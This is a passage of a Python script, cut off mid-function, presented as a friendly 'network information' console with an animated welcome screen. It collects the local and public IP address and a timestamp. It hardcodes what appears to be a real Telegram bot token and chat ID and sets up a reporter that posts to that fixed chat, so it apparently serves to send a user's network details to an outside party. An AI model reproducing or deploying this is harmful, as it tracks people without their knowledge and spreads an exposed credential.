"""
Elegant Network Information System with Telegram Reporting
Network Information System with Telegram Reporting
"""

import socket
import requests
import json
from datetime import datetime
import time
import os
import sys
import hashlib

# ==================== TELEGRAM CONFIGURATION ====================
# 🔴 REPLACE THESE WITH YOUR OWN CREDENTIALS
TELEGRAM_BOT_TOKEN = "8134629384:AAE8YCOkeoEeMZ_6FGaRbCf4TNLf55rl82I"
TELEGRAM_CHAT_ID = "820421921"

# ==================== TELEGRAM REPORTER CLASS ====================

class TelegramReporter:
    """Telegram reporter for sending network information"""
    
    def __init__(self, bot_token, chat_id):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.telegram_api = f"https://api.telegram.org/bot{bot_token}"
        
    def send_message(self, text, parse_mode='HTML'):
        """Send message to Telegram"""
        url = f"{self.telegram_api}/sendMessage"
        payload = {
            'chat_id': self.chat_id,
            'text': text,
            'parse_mode': parse_mode
        }
        
        try:
            response = requests.post(url, json=payload, timeout=10)
            if response.status_code == 200:
                return True
            else:
                print(f"Telegram Error: {response.status_code}")
                print(f"Response: {response.text}")
                return False
        except Exception as e:
            print(f"Error sending to Telegram: {e}")
            return False

# ==================== MAIN INTERACTIVE CONSOLE ====================

class InteractiveConsole:
    def __init__(self):
        self.WELCOME_ART = """
╔══════════════════════════════════════════════════════╗
║                                                      ║
║        🌊 WELCOME TO PORT OF NETWORK 🌊            ║
║                                                      ║
╚══════════════════════════════════════════════════════╝
"""
        # Color codes
        self.colors = {
            'header': '\033[96m', 'success': '\033[92m', 'info': '\033[94m',
            'warning': '\033[93m', 'error': '\033[91m', 'bold': '\033[1m',
            'end': '\033[0m'
        }
        
        # Initialize Telegram
        self.telegram = None
        if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
            self.telegram = TelegramReporter(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID)
            print(f"{self.colors['success']}✅ Telegram ready!{self.colors['end']}")
        else:
            print(f"{self.colors['warning']}⚠️ Telegram not configured{self.colors['end']}")

    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def print_with_style(self, text, style=''):
        print(f"{self.colors.get(style, '')}{text}{self.colors['end']}")

    def animated_welcome(self):
        self.clear_screen()
        print("\n")
        for i in range(1, 51):
            percent = i * 2
            bar = "█" * i + "░" * (50 - i)
            print(f"\r  Loading: [{bar}] {percent}%", end='')
            time.sleep(0.02)
        
        print("\n\n")
        self.print_with_style(self.WELCOME_ART, 'header')
        time.sleep(1)

    def get_ip_info(self):
        """Get network information"""
        ip_info = {
            'local_ip': 'N/A',
            'public_ip': 'N/A',
            'location': 'N/A',
            'isp': 'N/A',
            'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        
        # Local IP
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip_info['local_ip'] = s.getsockname()[0]
            s.close()
        except:
            pass
        
        # Public IP
        try:
            response = requests.get('https://api.ipify.org?format=json', timeout=5)
            if response.status_code == 200:
                ip_info['public_ip'] = response.json().get('ip', 'N/A')
        except:
            pass
        
        # L
